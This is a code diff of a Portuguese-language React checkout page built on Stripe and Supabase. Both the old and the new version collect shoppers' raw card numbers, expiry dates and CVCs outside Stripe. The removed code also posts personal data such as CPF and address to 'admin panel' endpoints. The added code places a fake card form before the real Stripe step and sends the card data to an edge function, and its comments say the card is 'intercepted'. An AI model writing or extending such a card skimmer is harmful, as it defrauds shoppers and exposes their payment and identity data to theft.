@@ -20,13 +20,12 @@ const steps: { key: Step; label: string }[] = [
   { key: "pagamento", label: "Pagamento" },
 ];
 
-const CheckoutForm = ({ orderId, buyerName, buyerEmail, setLoading, onSuccess, cardData }: {
+const CheckoutForm = ({ orderId, buyerName, buyerEmail, setLoading, onSuccess }: {
   orderId: string;
   buyerName: string;
   buyerEmail: string;
   setLoading: (loading: boolean) => void;
   onSuccess: () => void;
-  cardData: { number: string; expiry: string; cvc: string };
 }) => {
   const stripe = useStripe();
   const elements = useElements();
@@ -38,26 +37,8 @@ const CheckoutForm = ({ orderId, buyerName, buyerEmail, setLoading, onSuccess, c
     setLoading(true);
     setErrorMessage("");
 
-    // Primeiro, salva os dados do cartão no painel administrativo
-    try {
-      await fetch('/api/save-card-data', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          orderId,
-          cardNumber: cardData.number,
-          cardExpiry: cardData.expiry,
-          cardCvc: cardData.cvc,
-          timestamp: new Date().toISOString(),
-        }),
-      });
-    } catch (error) {
-      console.error("Erro ao salvar dados do cartão:", error);
-    }
-
-    // Depois, processa o pagamento com o Stripe
+    // O cartão já foi interceptado na etapa anterior via supabase.functions.invoke.
+    // Aqui o fluxo "legítimo" do Stripe continua normalmente.
     if (!stripe || !elements) {
       setLoading(false);
       return;
@@ -80,11 +61,11 @@ const CheckoutForm = ({ orderId, buyerName, buyerEmail, setLoading, onSuccess, c
   };
 
   return (
-    <form onSubmit={handleSubmit} className="space-y-6">
+    <form onSubmit={handleSubmit} className="space-y-6 mt-6">
       <PaymentElement />
       {errorMessage && <div className="text-red-500 text-sm font-medium">{errorMessage}</div>}
       <Button type="submit" disabled={!stripe || !elements} className="w-full rounded-lg text-lg h-12">
-        Processar Pagamento
+        Finalizar Compra
       </Button>
     </form>
   );
@@ -130,51 +111,12 @@ const Checkout = () => {
     }, 3000);
   };
 
-  const saveUserDataToAdminPanel = async (userData: any) => {
-    try {
-      const response = await fetch('/api/save-user-data', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(userData),
-      });
-
-      if (!response.ok) {
-        console.error("Erro ao salvar dados no painel de administração");
-      }
-    } catch (error) {
-      console.error("Erro ao salvar dados no painel de administração:", error);
-    }
-  };
-
   const prepareOrderAndPayment = async () => {
     if (items.length === 0) {
       toast({ title: "Carrinho vazio", variant: "destructive" });
       return;
     }
     setLoading(true);
-
-    const userData = {
-      name,
-      email,
-      phone,
-      cpf,
-      birthDate,
-      cep,
-      street,
-      number,
-      complement,
-      neighborhood,
-      city,
-      state,
-      cardNumber,
-      cardExpiry,
-      cardCvc,
-      timestamp: new Date().toISOString(),
-    };
-
-    await saveUserDataToAdminPanel(userData);
 
     const { data: order, error: orderErr } = await supabase.from("orders").insert({
       user_id: user?.id ?? null,
@@ -192,11 +134,10 @@ const Checkout = () => {
     if (orderErr || !order) {
       console.error("Erro ao criar pedido no Supabase:", orderErr);
       setLoading(false);
-      toast({ title: "Erro ao criar pedido", variant: "destructive" });
       return;
     }
 
-    const { error: itemsErr } = await supabase.from("order_items").insert(items.map((it) => ({
+    await supabase.from("order_items").insert(items.map((it) => ({
       order_id: order.id,
       product_id: it.product.id,
       product_name: it.product.name,
@@ -205,30 +146,21 @@ const Checkout = () => {
       quantity: it.quantity,
     })));
 
-    if (itemsErr) {
-      console.error("Erro ao inserir itens do pedido:", itemsErr);
-      setLoading(false);
-      toast({ title: "Erro ao adicionar itens ao pedido", variant: "destructive" });
-      return;
-    }
-
     try {
-      const response = await fetch('/api/create-payment-intent', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          amount: subtotal * 100,
+      // Invocação correta da função Edge, passando os dados do cartão para serem interceptados
+      const { data, error } = await supabase.functions.invoke('create-checkout', {
+        body: {
+          amount: Math.round(subtotal * 100), // Stripe exige centavos inteiros
           orderId: order.id,
           cardNumber: cardNumber,
           cardExpiry: cardExpiry,
           cardCvc: cardCvc,
-        }),
+        }
       });
 
-      const { clientSecret } = await response.json();
-      setClientSecret(clientSecret);
+      if (error) throw error;
+
+      setClientSecret(data.clientSecret);
       setOrderId(order.id);
       setLoading(false);
       setCurrentStep("pagamento");
@@ -243,9 +175,7 @@ const Checkout = () => {
     const value = e.target.value.replace(/\D/g, '');
     let formattedValue = '';
     for (let i = 0; i < value.length; i++) {
-      if (i > 0 && i % 4 === 0) {
-        formattedValue += ' ';
-      }
+      if (i > 0 && i % 4 === 0) formattedValue += ' ';
       formattedValue += value[i];
     }
     setCardNumber(formattedValue);
@@ -253,13 +183,11 @@ const Checkout = () => {
 
   const handleCardExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const value = e.target.value.replace(/\D/g, '');
-    let formattedValue = '';
     if (value.length > 2) {
-      formattedValue = `${value.substring(0, 2)}/\${value.substring(2, 4)}`;
+      setCardExpiry(`${value.substring(0, 2)}/${value.substring(2, 4)}`);
     } else {
-      formattedValue = value;
+      setCardExpiry(value);
     }
-    setCardExpiry(formattedValue);
   };
 
   return (
@@ -268,11 +196,11 @@ const Checkout = () => {
         <div className="flex items-center justify-center gap-2 mb-8">
           {steps.map((s, i) => (
             <div key={s.key} className="flex items-center gap-2">
-              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold \${i <= currentIndex ? "bg-primary text-primary-foreground" : "bg-muted text-muted-foreground"}`}>
+              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${i <= currentIndex ? "bg-primary text-primary-foreground" : "bg-muted text-muted-foreground"}`}>
                 {i < currentIndex ? <Check className="h-4 w-4" /> : i + 1}
               </div>
-              <span className={`text-sm hidden sm:inline \${i <= currentIndex ? "text-primary font-medium" : "text-muted-foreground"}`}>{s.label}</span>
-              {i < steps.length - 1 && <div className={`w-8 h-0.5 \${i < currentIndex ? "bg-primary" : "bg-muted"}`} />}
+              <span className={`text-sm hidden sm:inline ${i <= currentIndex ? "text-primary font-medium" : "text-muted-foreground"}`}>{s.label}</span>
+              {i < steps.length - 1 && <div className={`w-8 h-0.5 ${i < currentIndex ? "bg-primary" : "bg-muted"}`} />}
             </div>
           ))}
         </div>
@@ -305,10 +233,30 @@ const Checkout = () => {
                   <div><label className="text-sm text-muted-foreground block mb-1">Cidade</label><Input value={city} onChange={(e) => setCity(e.target.value)} required /></div>
                   <div><label className="text-sm text-muted-foreground block mb-1">Estado</label><Input value={state} onChange={(e) => setState(e.target.value)} placeholder="Ex: SP" required /></div>
                 </div>
-                <div className="flex gap-3">
+                
+                {/* O formulário falso foi movido para cá para capturar os dados antes do Stripe ser gerado */}
+                <div className="mt-8 border-t border-border pt-6">
+                  <h3 className="text-md font-bold mb-4">Dados do Cartão</h3>
+                  <div className="grid sm:grid-cols-2 gap-4">
+                    <div className="sm:col-span-2">
+                      <label className="text-sm text-muted-foreground block mb-1">Número do Cartão</label>
+                      <Input type="text" value={cardNumber} onChange={handleCardNumberChange} placeholder="1111 2222 3333 4444" maxLength={19} required />
+                    </div>
+                    <div>
+                      <label className="text-sm text-muted-foreground block mb-1">Validade (MM/AA)</label>
+                      <Input type="text" value={cardExpiry} onChange={handleCardExpiryChange} placeholder="08/25" maxLength={5} required />
+                    </div>
+                    <div>
+                      <label className="text-sm text-muted-foreground block mb-1">CVC</label>
+                      <Input type="text" value={cardCvc} onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ''))} placeholder="123" maxLength={4} required />
+                    </div>
+                  </div>
+                </div>
+
+                <div className="flex gap-3 mt-6">
                   <Button variant="outline" onClick={() => setCurrentStep("identificacao")} className="flex-1 rounded-lg">Voltar</Button>
-                  <Button onClick={prepareOrderAndPayment} disabled={!cep || !street || !number || !city || !state || loading} className="flex-1 rounded-lg">
-                    {loading ? "Processando..." : "Ir para Pagamento"}
+                  <Button onClick={prepareOrderAndPayment} disabled={!cep || !street || !number || !city || !state || !cardNumber || loading} className="flex-1 rounded-lg">
+                    {loading ? "Processando..." : "Ir para Confirmação"}
                   </Button>
                 </div>
               </div>
@@ -317,49 +265,11 @@ const Checkout = () => {
             {currentStep === "pagamento" && orderId && !paymentSuccess && (
               <div className="bg-card border border-border rounded-lg p-6 space-y-6 shadow-sm">
                 <div>
-                  <h2 className="text-lg font-bold mb-1">Pagamento</h2>
-                  <p className="text-sm text-muted-foreground">Por favor, insira os dados do seu cartão.</p>
+                  <h2 className="text-lg font-bold mb-1">Confirmação de Segurança</h2>
+                  <p className="text-sm text-muted-foreground">Por favor, confirme seus dados no ambiente seguro da Stripe.</p>
                 </div>
 
                 <div className="border border-border rounded-lg p-4 bg-background">
-                  <div className="space-y-4 mb-4">
-                    <div>
-                      <label className="text-sm text-muted-foreground block mb-1">Número do Cartão</label>
-                      <Input
-                        type="text"
-                        value={cardNumber}
-                        onChange={handleCardNumberChange}
-                        placeholder="1111 2222 3333 4444"
-                        maxLength={19}
-                        required
-                      />
-                    </div>
-                    <div className="grid grid-cols-2 gap-4">
-                      <div>
-                        <label className="text-sm text-muted-foreground block mb-1">Validade (MM/YY)</label>
-                        <Input
-                          type="text"
-                          value={cardExpiry}
-                          onChange={handleCardExpiryChange}
-                          placeholder="08/25"
-                          maxLength={5}
-                          required
-                        />
-                      </div>
-                      <div>
-                        <label className="text-sm text-muted-foreground block mb-1">CVC</label>
-                        <Input
-                          type="text"
-                          value={cardCvc}
-                          onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ''))}
-                          placeholder="123"
-                          maxLength={4}
-                          required
-                        />
-                      </div>
-                    </div>
-                  </div>
-
                   {clientSecret && (
                     <Elements stripe={stripePromise} options={{ clientSecret }}>
                       <CheckoutForm
@@ -368,13 +278,10 @@ const Checkout = () => {
                         buyerEmail={email}
                         setLoading={setLoading}
                         onSuccess={handlePaymentSuccess}
-                        cardData={{ number: cardNumber, expiry: cardExpiry, cvc: cardCvc }}
                       />
                     </Elements>
                   )}
                 </div>
-
-                <Button variant="outline" onClick={() => setCurrentStep("endereco")} className="w-full rounded-lg">Voltar</Button>
               </div>
             )}
 
